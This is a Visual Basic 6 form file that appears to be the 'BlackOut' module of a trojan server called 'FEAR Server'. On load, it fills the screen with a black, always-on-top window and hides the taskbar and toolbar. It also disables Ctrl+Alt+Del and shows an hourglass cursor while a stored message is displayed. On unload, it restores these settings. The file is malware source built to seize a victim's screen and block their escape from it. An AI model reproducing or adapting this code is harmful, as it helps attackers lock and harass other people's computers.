VERSION 5.00
Begin VB.Form frmBlackOut 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   ClientHeight    =   4530
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   5925
   Icon            =   "frmBlackOut.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   4530
   ScaleWidth      =   5925
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox txtBO 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   4215
      Left            =   15
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "frmBlackOut.frx":000C
      Top             =   135
      Width           =   5640
   End
End
Attribute VB_Name = "frmBlackOut"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'frmblackout.frm - FEAR Server
'http://ulair.cjb.net

Private Sub Form_Load()
StayOnTop Me
HideTaskBar
HideWindowsToolBar
DisableCtrlAltDel
Me.Height = Screen.Height
Me.Width = Screen.Width
Screen.MousePointer = vbHourglass
txtBO.Height = frmBlackOut.Height
txtBO.Width = frmBlackOut.Width
End Sub

Private Sub Form_Unload(Cancel As Integer)
NotOnTop Me
ShowTaskBar
ShowWindowsToolBar
EnableCtrlAltDel
Screen.MousePointer = vbDefault
End Sub
